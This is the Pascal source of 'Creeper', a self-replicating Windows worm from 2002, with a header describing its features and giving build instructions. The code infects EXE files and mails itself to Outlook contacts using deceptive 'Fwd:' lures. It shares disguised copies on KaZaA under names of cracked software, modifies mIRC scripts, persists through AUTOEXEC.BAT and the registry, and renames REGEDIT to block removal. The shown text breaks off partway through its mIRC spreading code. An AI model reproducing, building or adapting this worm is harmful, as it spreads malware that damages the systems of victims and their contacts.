   {           ÚÄ[ 2002 (c) worm ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
               ³øÉÍÍ»       ÉÍÍ» ÉÍÍÍÍÍÍ» ÉÍÍÍÍÍÍ»  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍ»ø³
               ³ ºÛÛÈ»     É¼ÛÛºÉ¼ÛÛÛÛÛÛÈ»ºÛÛÛÛÛÛÈ» ºÛÛÛÛÛÛÛÛÛÛÛÛÛº ³
               ³ ºÛÛÛº     ºÛÛÛººÛÛÛÉ»ÛÛÛººÛÛÉÍ»ÛÛº ºÛÛÛÉ»ÛÛÛÉ»ÛÛÛº ³
               ³ ºÛÛÛºÉ» É»ºÛÛÛººÛÛÉ¼È»ÛÛººÛÛÈÍ¼ÛÛº ºÛÛÛººÉÍ»ººÛÛÛº ³
               ³ ºÛÛÛººÈÍ¼ººÛÛÛººÛÛÈ»É¼ÛÛººÛÛÛÛÛÛÛº ºÛÛÛºÈ¼ È¼ºÛÛÛº ³
               ³ ºÛÛÛÈ¼ÛÛÛÈ¼ÛÛÛººÛÛÛÈ¼ÛÛÛººÛÛÉÍ»ÛÛÈ»ºÛÛÛº     ºÛÛÛº ³
               ³ ºÛÛÛÛÛÛÛÛÛÛÛÛÛºÈ»ÛÛÛÛÛÛÉ¼ºÛÛº È»ÛÛººÛÛÉ¼     È»ÛÛº ³
               ³øÈÍÍÍÍÍÍÍÍÍÍÍÍÍ¼ ÈÍÍÍÍÍÍ¼ ÈÍÍ¼  ÈÍÍ¼ÈÍÍ¼       ÈÍÍ¼ø³
               ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     presents:     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
                           ÚÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄ¿
                           ³  øÅø     CREEPER     øÅø  ³
                           ÀÄÄÄÅÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÅÄÄÄÙ
                               ÀÅø  21.jul.2002  øÅÙ
                                ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


   creeper is an internet worm reproducing through M$ Outlook, mIRC, KaZaA and old EXE
   files. it's a strongly improved version of the dixie flatline worm.

   features:

    - zip compression. the worm randomly chooses a TXT or DOC file on the current drive
      and creates a ZIP file in WINDOWS directory with the name of it. this archive will
      contain the TXT or DOC file (usually not under its original name) and a copy of
      the worm with the original name of the TXT or DOC file but with EXE extension.
    - random filesize. when the worm creates an independent copy of itself, it will add
      0 to 45000 bytes of garbage to it.
    - spreadind via M$ Outlook. the worm drops a vbscript which will send the ZIP file
      to the first 100 entries of the windoze address book. in 2/3 of all cases the mail
      looks like a forwarded message. its subject is chosen from a list of 15 different
      possibilities (some of them contain the name of the ZIP file as well). the message
      body also has a couple of different variations and if an originally TXT file has
      been zipped, it has a good chance that it will contain the first 5-25 lines of it.
    - spreading via mIRC. the worm looks for mIRC on 4 common installation paths. in case
      one of them exists, SCRIPT.INI will be created/modified to try to send the ZIP file
      to other users. it may occur on join or part and is delayed with 0-60 seconds.
    - spreading via the KaZaA p2p network. if KaZaA is installed on the computer,
      WINDOWS\SYSTEM\DRIVERS directory will be created and added to KaZaA's shared folder
      list. this directory will contain copies of the worm using the names of more than
      100 popular applications and some other most-wanted names like serial number
      collections or mailbox password crackers. there is a total of 130 different names
      and 90 of them may be added one of 12 appendixes like DOWNLOADER, CRACKED VERSION
      or KEYGEN. at next run more copies may be created using the same names but other
      'add-ons' (e.g. MAX PAYNE DOWNLOADER.EXE and MAX PAYNE CRACK.EXE may exist at the
      same time).
    - spreading via DOS EXE files. the main purpose of this feature is not to help
      spreading but to prevent the user from removing the worm simply by deleting some
      suspicious files. after each run more and more programs used by windoze get infected.
    - AUTOEXEC.BAT will be created/modified to execute the worm (WINDOWS\SYSTEM\MSREG32.EXE)
      at startup.
    - WINDOWS\SCANREG.VBS will be created and added to the registry to run at every windoze
      startup. this script will look for the two copies of the worm
      (WINDOWS\SYSTEM\MSREG32.EXE and WINDOWS\SYSTEM\UDESKTOP.DLL), if one of them is
      missing, it will be restored using the other one as source. AUTOEXEC.BAT will be
      checked as well; if the line executing WINDOWS\SYSTEM\MSREG32.EXE can't be found, it
      will be added again.
    - WINDOWS\REGEDIT.EXE will be renamed to WINDOWS\ASD.DLL to prevent the user from
      performing unneeded changes in the registry. REG file properties will be changed to
      use this file instead of WINDOWS\REGEDIT.EXE so these can still work properly.
    - independent copies of the worm (excluding WINDOWS\SYSTEM\MSREG32.EXE and
      WINDOWS\SYSTEM\UDESKTOP.DLL) display one of 8 error messages at run. the message is
      determined by a permanent byte in the worm's body so it won't vary at each run.
    - when an infected file is being executed, it has a small chance to display a message.
    - the worm has a harmless payload which may activate on the 3rd of each month (only if
      it's not the first time the worm is running on the system): WPAPER.BMP may be dropped
      into WINDOWS directory and set as wallpaper. besides, WINDOWS\WINSTART.BAT is
      overwritten with code displaying a Marilyn Manson quote, then deleting itself.
    - the worm's body is encrypted/compressed using a tool called 'Protect!'.

   compile this source with Turbo Pascal 7.0 and use PROTECT.EXE on it. compressed file
   must be added some crap to have an exact length of 24300 bytes (compile and compress it
   again if it would be larger :) then encode ZIP.EXE and WPAPER.BMP using ENCRYPT.EXE and
   append them to CREEPER.EXE in this order. the file should be exactly 45000 bytes long
   at the moment. now overwrite the last 4 bytes of the file with this:
   @c + a number from 2 to 9 + one garbage byte.
   }
   program creeper;
   {$m 60000,0,8000}
   {$i-}
   uses dos;
   const wormsize=24300;
         zipsize=14500;
         picsize=6200;
         size=wormsize+zipsize+picsize;
   var i,n:integer;
       time:longint;
       s1,s2,currentdir,windir,targetfile1,targetfile2:string;
       strings:array[1..25] of string;
       mircdir:array[1..4] of string;
       copybuf:array[1..size] of char;
       ds:dirstr;
       ns:namestr;
       es:extstr;
       key:byte;
       attr1,attr2,w1,w2,w3,day:word;
       first,ftext,hit:boolean;
       f1,f2,f3:file;
       t:text;
       r:searchrec;
   procedure infect(target:string);
   begin
    assign(f1,paramstr(0));
    assign(f3,'FILE#002.TMP');
    getfattr(f1,attr1);
    setfattr(f1,archive);
    setfattr(f3,archive);
    reset(f1,1);
    rewrite(f3,1);
    blockread(f1,copybuf,size);
    copybuf[size-1]:='1';
    key:=random(256);
    copybuf[size]:=chr(key);
    blockwrite(f3,copybuf,size);
    seek(f2,0);
    repeat
     blockread(f2,copybuf,size,w1);
     for w3:=1 to w1 do copybuf[w3]:=chr(ord(copybuf[w3]) xor key);
     blockwrite(f3,copybuf,w1,w2);
    until (w1=0) or (w1<>w2);
    seek(f2,0);
    seek(f3,0);
    getftime(f2,time);
    repeat
     blockread(f3,copybuf,size,w1);
     blockwrite(f2,copybuf,w1,w2);
    until (w1=0) or (w1<>w2);
    setftime(f2,time);
    close(f1);
    close(f3);
    setfattr(f1,attr1);
    erase(f3);
    hit:=true;
   end;
   procedure replicate;
   begin
    hit:=false;
    findfirst('*.EXE',anyfile,r);
    while (doserror=0) and (not hit) do
     begin
      copybuf[size-3]:='0';
      copybuf[size-2]:='0';
      assign(f2,r.name);
      getfattr(f2,attr2);
      setfattr(f2,archive);
      reset(f2,1);
      blockread(f2,copybuf,size);
      if (copybuf[25]<>'@') and (copybuf[size-3]<>'@') and (copybuf[size-2]<>'c')
      then infect(r.name);
      close(f2);
      setfattr(f2,attr2);
      findnext(r);
     end;
   end;
   procedure execute;
   begin
    assign(f1,paramstr(0));
    assign(f2,'FILE#002.EXE');
    getfattr(f1,attr1);
    setfattr(f1,archive);
    setfattr(f2,archive);
    reset(f1,1);
    rewrite(f2,1);
    seek(f1,size-1);
    blockread(f1,copybuf[1],1);
    key:=ord(copybuf[1]);
    repeat
     blockread(f1,copybuf,size,w1);
     for w3:=1 to w1 do copybuf[w3]:=chr(ord(copybuf[w3]) xor key);
     blockwrite(f2,copybuf,w1,w2);
    until (w1=0) or (w1<>w2);
    close(f1);
    close(f2);
    setfattr(f1,attr1);
    s1:='';
    for i:=1 to paramcount do s1:=s1+' '+paramstr(i);
    exec('FILE#002.EXE',s1);
    erase(f2);
   end;
   procedure copyme(target:string;aspect:char);
   begin
    assign(f1,paramstr(0));
    assign(f2,target);
    getfattr(f1,attr1);
    setfattr(f1,archive);
    reset(f1,1);
    rewrite(f2,1);
    blockread(f1,copybuf,size);
    copybuf[size-1]:=aspect;
    blockwrite(f2,copybuf,size);
    w1:=random(size);
    for w2:=1 to w1 do copybuf[w2]:=chr(random(256));
    blockwrite(f2,copybuf,w1);
    close(f1);
    close(f2);
    setfattr(f1,attr1);
   end;
   procedure drop(target:string;start,length:word);
   var f1,f2:file;
   begin
    assign(f1,paramstr(0));
    assign(f2,target);
    getfattr(f1,attr1);
    setfattr(f1,archive);
    setfattr(f2,archive);
    reset(f1,1);
    rewrite(f2,1);
    seek(f1,start);
    blockread(f1,copybuf,length);
    for w1:=1 to length do copybuf[w1]:=chr(ord(copybuf[w1]) xor 21);
    blockwrite(f2,copybuf,length);
    close(f1);
    close(f2);
    setfattr(f1,attr1);
   end;
   procedure dropbat;
   begin
    assign(t,windir+'WINSTART.BAT');
    setfattr(t,archive);
    rewrite(t);
    writeln(t,'@echo off');
    writeln(t,'cls');
    writeln(t,'echo "When you hate it you know you can feel but');
    writeln(t,'echo  When you love it you know it''s not real, no"');
    write(t,'del ',windir,'WINSTART.BAT');
    close(t);
   end;
   procedure check(target,line:string);
   begin
    hit:=false;
    ftext:=false;
    s2:='';
    s1:=fsearch(target,'');
    assign(t,target);
    if s1<>'' then
     begin
      setfattr(t,archive);
      reset(t);
      while not eof(t) do
       begin
        read(t,s1);
        if pos(line,s1)<>0 then ftext:=true;
        if (eof(t)) and (eoln(t)) and ((s1<>'') or (s2='')) then hit:=true
         else readln(t,s2);
       end;
     end
     else
     begin
       rewrite(t);
       if pos('SCRIPT.INI',target)<>0 then writeln(t,'[script]');
     end;
   end;
   procedure zip(parameter:string);
   var f1:file;
   begin
    drop(windir+'RUNDLL16.EXE',wormsize,zipsize);
    exec(windir+'RUNDLL16.EXE',parameter);
    assign(f1,windir+'RUNDLL16.EXE');
    erase(f1);
   end;
   procedure searchdir(path:pathstr;name:string;rnum:integer);
   var r:searchrec;
   begin
    findfirst(path+name,anyfile,r);
    while (doserror=0) and (s1='') do
     begin
      assign(f1,path+r.name);
      reset(f1,1);
      hit:=ioresult=0;
      if (pos('~',r.name)=0) and (filesize(f1)>200) and (filesize(f1)<20000) and (random(rnum)=0) then s1:=path+r.name;
      close(f1);
      findnext(r);
     end;
   end;
   procedure search(path:pathstr;name:string;rnum:integer);
   var r:searchrec;
   begin
    if s1<>'' then exit;
    searchdir(path,name,rnum);
    findfirst(path+'*.*',directory,r);
    while doserror=0 do
     begin
      if (r.attr and directory=directory) and (r.name[1]<>'.')
      then search(path+r.name+'\',name,rnum);
      findnext(r);
     end;
   end;
   function detectwindoze:boolean;assembler;
   asm
    mov ax,1600h
    int 2fh
   end;
   procedure loadname;
   begin
    case i of
     1:s1:='ACDSee 4.02';
     2:s1:='Ad-aware 5.83';
     3:s1:='Adobe Acrobat Reader 5.05';
     4:s1:='Adobe Photoshop 7.0';
     5:s1:='AdSubtract Pro 2.5';
     6:s1:='All Cleaner 2.0';
     7:s1:='AntiVir 6 Personal Edition';
     8:s1:='AntiVirus eXpert Pro 6.1';
     9:s1:='Black & White';
     10:s1:='BlackICE Defender 2.9';
     11:s1:='CloneCD 3.3.4.1';
     12:s1:='Command & Conquer - Renegade';
     13:s1:='CruiseControl 1.0';
     14:s1:='Customizer XP 1.8.2';
     15:s1:='CuteFTP 5.0';
     16:s1:='Diablo 2';
     17:s1:='Download Accelerator Plus 5.3';
     18:s1:='Download Express 1.2.74';
     19:s1:='Dr. Hardware 2002 Build 3.0.0d';
     20:s1:='Dungeon Siege';
     21:s1:='DVDx 2.0';
     22:s1:='Easy DVD Player 1.0';
     23:s1:='Eudora E-mail 4.3';
     24:s1:='FIFA 2002';
     25:s1:='FlashGet 1.3';
     26:s1:='F-Secure Anti-Virus 5.30';
     27:s1:='GetRight 4.5d';
     28:s1:='Go!Zilla 4.11';
     29:s1:='Grand Theft Auto 3';
     30:s1:='Half-Life';
     31:s1:='ICQ 2002a Beta 5.33 Build 3728';
     32:s1:='ICQ Plus 3.4';
     33:s1:='Irfan View 3.61';
     34:s1:='Kahli Deskmate 3.2';
     35:s1:='Kaspersky Anti-Virus Personal 4.0';
     36:s1:='Macromedia Dreamweaver MX';
     37:s1:='Macromedia Fireworks MX';
     38:s1:='Macromedia Flash MX';
     39:s1:='Mass Downloader 2.3';
     40:s1:='Max Payne';
     41:s1:='McAfee Firewall 3.01';
     42:s1:='McAfee VirusScan Multi-Platform 4.5';
     43:s1:='Medal of Honor - Allied Assault';
     44:s1:='Microsoft Internet Explorer 6.0';
     45:s1:='Microsoft Office 2000 Professional';
     46:s1:='Microsoft Office XP Professional';
     47:s1:='Microsoft Outlook Express 6.0';
     48:s1:='Microsoft Windows 2000 Professional';
     49:s1:='Microsoft Windows XP Professional';
     50:s1:='MoviePlay 3.52';
     51:s1:='MSN Messenger 4.6';
     52:s1:='Nero Burning ROM 5.5.9.0';
     53:s1:='Net Detective 7.0';
     54:s1:='Netbus Spector Professional Edition';
     55:s1:='Norton AntiVirus 2002 8.0';
     56:s1:='Norton Internet Security 2002';
     57:s1:='Norton Personal Firewall 2002';
     58:s1:='Paint Shop Pro 7.04';
     59:s1:='Panda Antivirus Platinum 6.23';
     60:s1:='Partition Manager 2.40';
     61:s1:='pcAnywhere 10.5';
     62:s1:='PC-cillin 2000';
     63:s1:='Popup Killer 1.0';
     64:s1:='Quake 3 Arena';
     65:s1:='QuickTime Player 5.0.2';
     66:s1:='RAMBooster 1.6';
     67:s1:='RealPlayer 8';
     68:s1:='RegCleaner 4.3.0780';
     69:s1:='Registry System Wizard 1.2.26';
     70:s1:='Return to Castle Wolfenstein';
     71:s1:='SoftCam 1.0.2';
     72:s1:='Soldier of Fortune 2 - Double Helix';
     73:s1:='Spy Cleaner 6.1';
     74:s1:='Star Wars Jedi Knight 2 - Jedi Outcast';
     75:s1:='Tahni Deskmate 3.2';
     76:s1:='The Bat 1.60m';
     77:s1:='The Sims';
     78:s1:='Tony Hawks Pro Skater 2';
     79:s1:='Trillian 0.73';
     80:s1:='Turbo Connection 2.0';
     81:s1:='Unreal Tournament';
     82:s1:='VirtuaGirl Deskmate 2.10';
     83:s1:='Warcraft 3';
     84:s1:='WinAce 2.2';
     85:s1:='Windows Commander 5.0';
     86:s1:='WinRAR 3.0';
     87:s1:='WinZip 8.1';
     88:s1:='WorldWeb 2.0a';
     89:s1:='XP AntiSpy 3.51';
     90:s1:='Zone Alarm 3.1.282 Beta';
     91:s1:='Anonymous Mail Bomber';
     92:s1:='Anonymous SMS Bomber';
     93:s1:='AntiNimda 1.0';
     94:s1:='Archive Password Cracker (ZIP, RAR, ARJ, ACE)';
     95:s1:='Back Orifice 2000 Trojan';
     96:s1:='CD Key Collection 2002';
     97:s1:='Counter-Strike 1.5 Downloader';
     98:s1:='Credit Card Number Generator (Visa, Mastercard, American Express)';
     99:s1:='DivX Standard-Edition 5.02';
     100:s1:='E-mail Password Cracker';
     101:s1:='FloodNet DoS Attack Launcher';
     102:s1:='FTP Password Hacker';
     103:s1:='ICQ Password Cracker';
     104:s1:='Instant Hotmail Password Cracker';
     105:s1:='Internet Worm Construction Kit';
     106:s1:='IP Spoofer for Windows (100% working)';
     107:s1:='IRC FloodBots';
     108:s1:='KaZaA Lite 1.7.1';
     109:s1:='Largest Serial Number Collection Ever';
     110:s1:='Masters'' Hack Utilities 2002';
     111:s1:='mIRC 6.02';
     112:s1:='Morpheus 1.9.1';
     113:s1:='Neo Napster 2.1';
     114:s1:='Netscape 6.2.3';
     115:s1:='Opera 6.03';
     116:s1:='Passwords for TOP XXX & PORN sites';
     117:s1:='Remote mIRC & Pirch Hack Tool';
     118:s1:='SEX SITE HACKED PASSWORD COLLECTION';
     119:s1:='SubSeven 2.2 Trojan';
     120:s1:='Symantec Klez Fix Tool 1.0.2';
     121:s1:='Ultimate Cheat Collection';
     122:s1:='Unlocker for ALL Motorola Mobile Phones';
     123:s1:='Unlocker for ALL Nokia Mobile Phones';
     124:s1:='Unlocker for ALL Samsung Mobile Phones';
     125:s1:='Unlocker for ALL Siemens Mobile Phones';
     126:s1:='Unlocker for ALL Sony Mobile Phones';
     127:s1:='Virus Generator Tool 2.0';
     128:s1:='Web Cracker 2002';
     129:s1:='WinAmp 3.0 Beta 3';
     130:s1:='WinNuke 2002 (freezes ANY Windows box)';
    end;
   end;
   label 1;
   begin
    randomize;
    getdir(0,currentdir);
    first:=true;
    mircdir[1]:='\MIRC\';
    mircdir[2]:='\MIRC32\';
    mircdir[3]:='\PROGRA~1\MIRC\';
    mircdir[4]:='\PROGRA~1\MIRC32\';
    repeat
     inc(i);
     if copy(envstr(i),1,11)='winbootdir=' then windir:=copy(envstr(i),12,length(envstr(i))-11)+'\';
    until (i>envcount) or (copy(envstr(i),1,7)='windir=');
    if i<=envcount then windir:=copy(envstr(i),8,length(envstr(i))-7)+'\';
    if windir='' then goto 1;
    chdir(windir+'SYSTEM');
    targetfile1:=windir+'SYSTEM\MSREG32.EXE';
    if fsearch(targetfile1,'')='' then copyme(targetfile1,'0')
     else first:=false;
    if fsearch(windir+'SYSTEM\UDESKTOP.DLL','')='' then copyme(windir+'SYSTEM\UDESKTOP.DLL','0')
     else first:=false;
    findfirst(windir+'SYSTEM\DRIVERS',directory,r);
    if doserror<>0 then mkdir(windir+'SYSTEM\DRIVERS');
    chdir(windir+'SYSTEM\DRIVERS');
    if fsearch(windir+'SYSTEM\DRIVERS\PACKAGER.EXE','')='' then copyme(windir+'SYSTEM\DRIVERS\PACKAGER.EXE',chr(random(8)+50))
     else first:=false;
    chdir(windir);
    assign(f1,windir+'REGEDIT.EXE');
    if fsearch(windir+'ASD.DLL','')='' then
     begin
      if fsearch(windir+'REGEDIT.EXE','')<>'' then rename(f1,windir+'ASD.DLL');
     end
     else first:=false;
    if (fsearch(windir+'REGEDIT.EXE','')<>'') then
     begin
      setfattr(f1,archive);
      erase(f1);
     end;
    hit:=ioresult=0;
    n:=0;
    if fsearch(windir+'WINSOCK.DAT','')<>'' then
     begin
      first:=false;
      inc(n);
      assign(t,windir+'WINSOCK.DAT');
      setfattr(t,archive);
      reset(t);
      read(t,s1);
      close(t);
      for i:=1 to length(s1) do s1[i]:=chr(ord(s1[i]) xor 21);
      if fsearch(s1,'')<>'' then inc(n);
     end;
    getdate(w1,w2,day,w3);
    if (day=3) and (not first) and (random(5)=0) then
     begin
      day:=0;
      dropbat;
      drop(windir+'WPAPER.BMP',wormsize+zipsize,picsize);
     end;
    if n=2 then targetfile2:=s1
     else
      begin
       s1:='';
       i:=6;
       repeat
        if random(2)=0 then search('\','*.DOC',i div 2);
        if s1='' then search('\','*.TXT',i);
        i:=i-2;
        fsplit(s1,ds,ns,es);
       until ((s1<>'') and (fsearch(windir+ns+'.EXE','')='') and (fsearch(windir+ns+'.ZIP','')='')) or (i<0);
       if s1='' then goto 1;
       targetfile2:=windir+ns+'.ZIP';
       copyme(windir+ns+'.EXE',chr(random(8)+50));
       assign(t,s1);
       if es='.TXT' then
        begin
         getfattr(t,attr1);
         setfattr(t,archive);
         reset(t);
         i:=0;
         n:=5+random(21);
         repeat
          inc(i);
          readln(t,strings[i]);
          for w1:=1 to length(strings[i]) do if strings[i,w1]='"' then strings[i,w1]:='''';
         until (i>n) or (eof(t));
         strings[i]:='-<@END@>-';
         close(t);
         setfattr(t,attr1);
        end;
        case random(5) of
         0:if (es='.TXT') and (random(2)=0) then s2:=ds+'FILE_ID.DIZ'
          else s2:=ds+'INFO'+es;
         1:if (es='.TXT') and (random(2)=0) then s2:=ds+'INFO.DOC'
          else s2:=ds+'MANUAL'+es;
         2:if (es='.TXT') and (random(2)=0) then s2:=ds+'README.1ST'
          else s2:=ds+'README'+es;
         3:if (es='.TXT') and (random(2)=0) then s2:=ds+ns+'.NFO'
          else s2:=ds+'README.DOC';
         4:s2:=s1;
        end;
       if s1<>s2 then rename(t,s2);
       zip(targetfile2+' '+s2+' '+windir+ns+'.EXE');
       if s1<>s2 then rename(t,s1);
       assign(f1,windir+ns+'.EXE');
       erase(f1);
       hit:=ioresult=0;
       assign(t,windir+'WINSOCK.DAT');
       setfattr(t,archive);
       rewrite(t);
       s1:=targetfile2;
       for i:=1 to length(s1) do s1[i]:=chr(ord(s1[i]) xor 21);
       write(t,s1);
       close(t);
      end;
    if fsearch(windir+'WSCRIPT.EXE','')<>'' then
     begin
      assign(t,windir+'SCANREG.VBS');
      setfattr(t,archive);
      rewrite(t);
      writeln(t,'dim v1,v2,v3,v4,f1,f2,f3');
      writeln(t,'f1=wscript.arguments(0)');
      writeln(t,'f2=wscript.arguments(1)');
      writeln(t,'f3=wscript.arguments(2)');
      writeln(t,'set v1=createobject("scripting.filesystemobject")');
      writeln(t,'restore f1,f2');
      writeln(t,'restore f2,f1');
      writeln(t,'if v1.fileexists(f1) then');
      writeln(t,' if v1.fileexists(f3) then');
      writeln(t,'  set v2=v1.opentextfile(f3,1)');
      writeln(t,'  v3=v2.readall');
      writeln(t,'  v4=replace(v3,f1,"")');
      writeln(t,'  if v3=v4 then');
      writeln(t,'   set v2=v1.getfile(f3)');
      writeln(t,'   v2.attributes=0');
      writeln(t,'   set v2=v1.opentextfile(f3,8)');
      writeln(t,'   v2.writeline vbcrlf&f1');
      writeln(t,'  end if');
      writeln(t,' elseif not v1.fileexists(f3) then');
      writeln(t,'  set v2=v1.createtextfile(f3)');
      writeln(t,'  v2.writeline f1');
      writeln(t,' end if');
      writeln(t,' v2.close');
      writeln(t,'end if');
      writeln(t,'sub restore(s,t)');
      writeln(t,'if v1.fileexists(s) then');
      writeln(t,' if not v1.fileexists(t) then');
      writeln(t,'  v1.copyfile s,t');
      writeln(t,' end if');
      writeln(t,'end if');
      write(t,'end sub');
      close(t);
      if detectwindoze then
       begin
        assign(t,windir+'INTERNAT.VBS');
        setfattr(t,archive);
        rewrite(t);
        writeln(t,'dim v1,v2,v3,v4,v5,v6');
        writeln(t,'on error resume next');
        if first then
         begin
          writeln(t,'set v1=createobject("outlook.application")');
          writeln(t,'set v2=v1.getnamespace("mapi")');
          writeln(t,'for v3=1 to v2.addresslists.count');
          writeln(t,'set v4=v2.addresslists(v3)');
          writeln(t,'v5=1');
          writeln(t,'set v6=v1.createitem(0)');
          writeln(t,'for v7=1 to v4.addressentries.count');
          writeln(t,'v8=v4.addressentries(v5)');
          writeln(t,'v6.recipients.add v8');
          writeln(t,'v5=v5+1');
          writeln(t,'if v5>100 then exit for');
          writeln(t,'next');
          write(t,'v6.subject="');
          i:=random(15);
          case i of
           0:writeln(t,'Fwd: ',ns,'"');
           1:writeln(t,'Fwd: The ',ns,' you''ve mentioned.."');
           2:writeln(t,'Fwd: This kicks ass ;-)"');
           3:writeln(t,'Fwd: Warez"');
           4:writeln(t,'Fwd: (None)"');
           5:writeln(t,'Fwd: Re: ',ns,'"');
           6:writeln(t,'Fwd: Re: Hey, I still need that ',ns,'.."');
           7:writeln(t,'Fwd: Re: Question"');
           8:writeln(t,'Fwd: Re: Send me that ',ns,' stuff please"');
           9:writeln(t,'Fwd: Re: (None)"');
           10:writeln(t,ns,'"');
           11:writeln(t,'Interesting.."');
           12:writeln(t,'Kickass ;-)"');
           13:writeln(t,'Stuff"');
           14:writeln(t,'(None)"');
          end;
          write(t,'v6.body=');
          if i<10 then
           begin
            case random(6) of
             0:write(t,'"cool!!"&vbcrlf&');
             1:write(t,'"hehehm.. :-p"&vbcrlf&');
             2:write(t,'"huh.. :-o"&vbcrlf&');
             3:write(t,'"Kewl! :-)"&vbcrlf&');
             4:write(t,'"Rulezz! ;-)"&vbcrlf&');
             5:write(t,'"WOW!!"&vbcrlf&');
            end;
            if random(2)=0 then write(t,'vbcrlf&');
            write(t,'"-----Original Message-----"&vbcrlf&vbcrlf&')
           end;
          if (es='.TXT') and (strings[1]<>'-<@END@>-') and (random(3)<>0) then
           begin
            i:=1;
            while strings[i]<>'-<@END@>-' do
             begin
              write(t,'"',strings[i],'"');
              inc(i);
              if strings[i]<>'-<@END@>-' then write(t,'&vbcrlf&');
             end;
           end
           else
            begin
             case random(6) of
              0:write(t,'"Eya');
              1:write(t,'"Greetings');
              2:write(t,'"Hello');
              3:write(t,'"Hey');
              4:write(t,'"Hi');
              5:write(t,'"Hiya');
             end;
             if random(2)=0 then write(t,'!"&vbcrlf&')
              else write(t,',"&vbcrlf&');
             if random(2)=0 then write(t,'vbcrlf&');
             case random(6) of
              0:write(t,'"Check this out right now! ;-)"&vbcrlf&"It should be able to run on all Windoze versions."&vbcrlf&');
              1:write(t,'"I''m sure you''ll like this one.."&vbcrlf&');
              2:write(t,'"If I can remember well, you were the one asking for this stuff.."&vbcrlf&');
              3:write(t,'"Here you have some quality piece of warez.."&vbcrlf&');
              4:write(t,'"So you liked the previous one.. then you''ll LOVE this one ;-)"&vbcrlf&');
              5:write(t,'"You haven''t written to me for months.."&vbcrlf&"I hope this will help you to remember.. ;-)"&vbcrlf&');
             end;
             case random(6) of
              0:write(t,'"And don''t forget to write to me again.. ;-)"&vbcrlf&');
              1:write(t,'"By the way, IMHO this program is the BEST in its category."&vbcrlf&');
              2:write(t,'"I hope I''ve posted this to the right recipient.."&vbcrlf&"If not, just ignore it. :-)"&vbcrlf&');
              3:write(t,'"I send this to you as it''s pretty funny, and I mean FUNNY.. ;-)"&vbcrlf&');
              4:write(t,'"It''s pretty self-explaining but just throw me a mail if you have any problems."&vbcrlf&');
              5:write(t,'"It''s simply a must-have."&vbcrlf&');
             end;
             if random(2)=0 then write(t,'vbcrlf&');
             case random(10) of
              0:write(t,'"Bye"');
              1:write(t,'"Bye now.."');
              2:write(t,'"Cya"');
              3:write(t,'"Have a nice day"');
              4:write(t,'"Have fun! ;-)"');
              5:write(t,'"Have to go now.."');
              6:write(t,'"Later."');
              7:write(t,'"See ya"');
              8:write(t,'"See ya l8er.."');
              9:write(t,'"See you later.."');
             end;
            end;
          writeln(t,'');
          writeln(t,'v6.attachments.add"',targetfile2,'"');
          writeln(t,'v6.deleteaftersubmit=true');
          writeln(t,'v6.send');
          writeln(t,'next');
         end;
        writeln(t,'set v1=createobject("scripting.filesystemobject")');
        writeln(t,'set v2=createobject("wscript.shell")');
        writeln(t,'v3=""');
        writeln(t,'v3=v2.regread("HKEY_CURRENT_USER\Software\Kazaa\Transfer\DlDir0")');
        writeln(t,'if v3<>"" then');
        writeln(t,' v2.regwrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\Dir0","012345:',windir,'SYSTEM\DRIVERS"');
        writeln(t,' v2.regwrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DisableSharing",0,"REG_DWORD"');
        for i:=1 to 130 do
         begin
          loadname;
          s1:=windir+'SYSTEM\DRIVERS\'+s1;
          if i<90 then
           begin
            if random(2)=0 then
             begin
              n:=random(3);
              case n of
               0:s1:=s1+' Cracked';
               1:s1:=s1+' Full';
              end;
              if (n<2) and (random(2)=0) then s1:=s1+' Version';
              if random(3)<>0 then s1:=s1+' Downloader';
             end
             else
              begin
               case random(4) of
                0:s1:=s1+' Crack';
                1:s1:=s1+' Keygen';
                2:s1:=s1+' Serial';
               end;
              end;
           end;
          s1:=s1+'.exe';
          writeln(t,' if not v1.fileexists("',s1,'") then');
          writeln(t,'  v1.copyfile"',windir,'SYSTEM\DRIVERS\PACKAGER.EXE","',s1,'"');
          writeln(t,' end if');
         end;
        writeln(t,'end if');
        writeln(t,'v1.deletefile"',windir,'SYSTEM\DRIVERS\PACKAGER.EXE"');
        write(t,'v2.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Scanreg","');
        writeln(t,windir,'SCANREG.VBS ',targetfile1,' ',windir,'SYSTEM\UDESKTOP.DLL ',copy(windir,1,3),'AUTOEXEC.BAT"');
        writeln(t,'v2.regwrite "HKEY_CLASSES_ROOT\"&v2.regread("HKEY_CLASSES_ROOT\.reg\")&"\DefaultIcon\","',windir,'ASD.DLL,1"');
        write(t,'v2.regwrite "HKEY_CLASSES_ROOT\"&v2.regread("HKEY_CLASSES_ROOT\.reg\")&"\shell\open\command\","');
        writeln(t,windir,'ASD.DLL ""%1"""');
        if day=0 then
         begin
          writeln(t,'v2.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper","',windir,'WPAPER.BMP"');
          writeln(t,'v2.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\TileWallpaper","0"');
          writeln(t,'v2.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\WallpaperStyle","0"');
         end;
        writeln(t,'set v1=createobject("scripting.filesystemobject")');
        write(t,'v1.deletefile wscript.scriptfullname');
        close(t);
        exec(windir+'WSCRIPT.EXE',windir+'INTERNAT.VBS //B');
       end;
     end;
    chdir(copy(windir,1,3));
    check(copy(windir,1,3)+'AUTOEXEC.BAT',targetfile1);
    if not ftext then
     begin
      append(t);
      if hit then writeln(t,'');
      writeln(t,targetfile1);
     end;
    close(t);
    i:=0;
    repeat
     inc(i);
     chdir(mircdir[i]);
    until (i>4) or (fsearch(mircdir[i]+'MIRC.INI','')<>'');
    if i<=4 then
     begin
      hit:=ioresult=0;
      check(mircdir[i]+'SCRIPT.INI',targetfile2);
      if not ftext then
       begin
        append(t);
        if hit then writeln(t,'');
        if random(2)=0 then writeln(t,'n0=on 1:JOIN:#:{')
